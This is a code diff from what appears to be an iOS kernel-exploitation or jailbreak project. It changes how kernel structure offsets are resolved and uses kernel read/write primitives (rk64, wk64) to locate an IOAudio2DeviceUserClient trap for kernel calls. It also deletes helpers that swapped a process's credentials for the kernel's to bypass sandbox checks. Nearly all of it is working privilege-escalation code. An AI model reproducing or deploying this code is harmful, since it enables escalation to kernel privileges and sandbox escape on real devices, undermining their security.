@@ -9,11 +9,13 @@
 #include "IOKitLib.h"
 #include "kernel_call.h"
 #include "kc_parameters.h"
+#include "kern_utils.h"
 #include "pac.h"
 #include "kmem.h"
+#include "offsets.h"
+#include "offsetof.h"
 #include "log.h"
 #include "mach_vm.h"
-#include "parameters.h"
 
 // ---- Global variables --------------------------------------------------------------------------
 
@@ -42,72 +44,29 @@ bool
 kernel_ipc_port_lookup(uint64_t task, mach_port_name_t port_name,
 		uint64_t *ipc_port, uint64_t *ipc_entry) {
 	// Get the task's ipc_space.
-	uint64_t itk_space = rk64(task + OFFSET(task, itk_space));
+	uint64_t itk_space = rk64(task + _koffset(KSTRUCT_OFFSET_TASK_ITK_SPACE));
 	// Get the size of the table.
-	uint32_t is_table_size = rk32(itk_space + OFFSET(ipc_space, is_table_size));
+	uint32_t is_table_size = rk32(itk_space + _koffset(KSTRUCT_OFFSET_IPC_SPACE_IS_TABLE_SIZE));
 	// Get the index of the port and check that it is in-bounds.
 	uint32_t port_index = MACH_PORT_INDEX(port_name);
 	if (port_index >= is_table_size) {
 		return false;
 	}
 	// Get the space's is_table and compute the address of this port's entry.
-	uint64_t is_table = rk64(itk_space + OFFSET(ipc_space, is_table));
-	uint64_t entry = is_table + port_index * SIZE(ipc_entry);
+	uint64_t is_table = rk64(itk_space + _koffset(KSTRUCT_OFFSET_IPC_SPACE_IS_TABLE));
+    uint64_t entry = is_table + port_index * 0x18; //SIZE(ipc_entry);
 	if (ipc_entry != NULL) {
 		*ipc_entry = entry;
 	}
 	// Get the address of the port if requested.
 	if (ipc_port != NULL) {
-		*ipc_port = rk64(entry + OFFSET(ipc_entry, ie_object));
+        *ipc_port = rk64(entry + 0x0);//OFFSET(ipc_entry, ie_object));
 	}
 	return true;
 }
 
 
 // ---- Stage 1 -----------------------------------------------------------------------------------
-
-/*
- * kernel_get_proc_for_task
- *
- * Description:
- * 	Get the proc struct for a task.
- */
-static uint64_t
-kernel_get_proc_for_task(uint64_t task) {
-	return rk64(task + OFFSET(task, bsd_info));
-}
-
-/*
- * assume_kernel_credentials
- *
- * Description:
- * 	Set this process's credentials to the kernel's credentials so that we can bypass sandbox
- * 	checks.
- */
-// NOT NEEDED, ALREADY RUNNING AS KERNEL
-//static void
-//assume_kernel_credentials(uint64_t *ucred_field, uint64_t *ucred) {
-//	uint64_t proc_self = kernel_get_proc_for_task(current_task);
-//	uint64_t kernel_proc = kernel_get_proc_for_task(kernel_task);
-//	uint64_t proc_self_ucred_field = proc_self + OFFSET(proc, p_ucred);
-//	uint64_t kernel_proc_ucred_field = kernel_proc + OFFSET(proc, p_ucred);
-//	uint64_t proc_self_ucred = rk64(proc_self_ucred_field);
-//	uint64_t kernel_proc_ucred = rk64(kernel_proc_ucred_field);
-//	wk64(proc_self_ucred_field, kernel_proc_ucred);
-//	*ucred_field = proc_self_ucred_field;
-//	*ucred = proc_self_ucred;
-//}
-
-/*
- * restore_credentials
- *
- * Description:
- * 	Restore this process's credentials after calling assume_kernel_credentials().
- */
-static void
-restore_credentials(uint64_t ucred_field, uint64_t ucred) {
-	wk64(ucred_field, ucred);
-}
 
 /*
  * stage0_create_user_client
@@ -131,7 +90,6 @@ stage0_create_user_client() {
 	// Assume the kernel's credentials in order to look up the user client. Otherwise we'd be
 	// denied with a sandbox error.
 	uint64_t ucred_field, ucred;
-	//assume_kernel_credentials(&ucred_field, &ucred);
 	// Now try to open each service in turn.
 	for (;;) {
 		// Get the service.
@@ -155,7 +113,6 @@ stage0_create_user_client() {
 		DEBUG_TRACE(2, "could not open %s", "IOAudio2DeviceUserClient");
 	}
 	// Restore the credentials.
-	//restore_credentials(ucred_field, ucred);
 fail_1:
 	IOObjectRelease(iter);
 fail_0:
@@ -176,7 +133,7 @@ stage0_find_user_client_trap() {
 	bool ok = kernel_ipc_port_lookup(current_task, connection, &user_client_port, NULL);
 	assert(ok);
 	// Get the address of the IOAudio2DeviceUserClient.
-	user_client = rk64(user_client_port + OFFSET(ipc_port, ip_kobject));
+	user_client = rk64(user_client_port + _koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));
 	// Get the address of the IOExternalTrap.
 	trap = rk64(user_client + OFFSET(IOAudio2DeviceUserClient, traps));
 	DEBUG_TRACE(2, "%s is at 0x%016llx", "IOExternalTrap", trap);
